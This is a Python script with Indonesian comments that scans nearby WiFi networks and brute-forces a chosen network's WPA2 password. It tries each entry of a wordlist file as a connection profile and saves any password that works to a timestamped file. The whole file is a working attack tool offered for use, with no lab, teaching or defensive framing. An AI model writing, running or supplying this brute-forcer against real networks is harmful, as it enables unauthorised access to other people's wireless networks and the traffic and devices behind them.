import sys, time, os
from datetime import datetime
from pywifi import PyWiFi, const, Profile
from scapy.all import *
from tabulate import tabulate

wifi = PyWiFi()
ifnt = wifi.interfaces()[1]  # Menggunakan interface pertama
berhasil_bruteforce = []

def scan():
    print("\n🔍 Sedang melakukan scanning jaringan WiFi...")
    ifnt.scan()
    time.sleep(5)
    
    hasil = ifnt.scan_results()
    uj = sorted(hasil, key=lambda x: x.signal, reverse=True)
    
    if not hasil:
        print("❌ Tidak ada jaringan WiFi yang ditemukan.")
        return
    
    data = [[i + 1, jaringan.ssid, jaringan.signal] for i, jaringan in enumerate(uj)]
    print(tabulate(data, headers=["NO", "SSID", "SIGNAL"], tablefmt="heavy_grid"))
    
    try:
        sy = int(input("\nMasukkan nomor jaringan yang ingin dicoba: "))
        
        if 1 <= sy <= len(hasil):
            jaringanGW = uj[sy - 1]
            print(f"\n🔓 SSID: {jaringanGW.ssid} | Signal: {jaringanGW.signal}")
            
            attack = input("Ingin mulai brute force? (y/n): ").lower()
            if attack == "y":
                return GasAttack(jaringanGW.ssid)
            else:
                print("Terima kasih!")
                return
        else:
            print("❌ Pilihan tidak ada di menu!")
            os.system("cls" if os.name == "nt" else "clear")
            return scan()
    
    except ValueError:
        print("⚠️ Input harus berupa angka!")
        return scan()

def GasAttack(ssid):

    global berhasil_bruteforce

    try:
        with open("pass.txt", "r") as file:
            pass_list = file.read().splitlines()
    except FileNotFoundError:
        print("❌ File pass.txt tidak ditemukan!")
        return

    valid_password = None  # Simpan password yang benar
    
    for password in pass_list:
        print(f"🔑 Mencoba password: {password}")
        if TryConnect(ifnt, ssid, password):  # Cek apakah berhasil
            print(f"✅ Password ditemukan: {password}")
            valid_password = password  # Simpan password yang benar, tapi jangan konek dulu
            berhasil_bruteforce.append((ssid, password))
            break

    if valid_password:
        print(f"🔄 Semua password sudah dicoba. Menghubungkan ke {ssid} dengan password {valid_password}...")
        TryConnect(ifnt, ssid, valid_password)
        save_password(ssid, valid_password, berhasil_bruteforce)

    else:
        print("❌ Tidak ada password yang cocok.")

def TryConnect(ifnt, ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    ifnt.remove_all_network_profiles() # hapus 
    tmp_profile = ifnt.add_network_profile(profile) # gunakan profile baru
    
    ifnt.disconnect()
    time.sleep(2)
    ifnt.connect(tmp_profile)
    
    time.sleep(3)
    if ifnt.status() == const.IFACE_CONNECTED:
        return True
    else:
        ifnt.disconnect()
        return False

def save_password(ssid, password, listUser):

    if not os.path.exists("done"):
        os.makedirs("done")  # Buat folder jika belum ada

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"done/{timestamp}.txt"

    with open(filename, "w") as file:
        file.write(f"📋 Hasil Brute Force - {timestamp}\n")
        file.write("=" * 40 + "\n")
        file.write(f"🔢 Perangkat Yang Terhubung {len(listUser)} Perangkat\n\n")
        for i, (ssid, password) in enumerate(listUser, 1):
            file.write(f"{i}. SSID : {ssid}\n")
            file.write(f"{i}. Password : {password} \n\n")
        file.write("=" * 40 + "\n")
    
    print(f"💾 Password berhasil disimpan di {filename}")

if __name__ == "__main__":
    listUser = []
    scan()
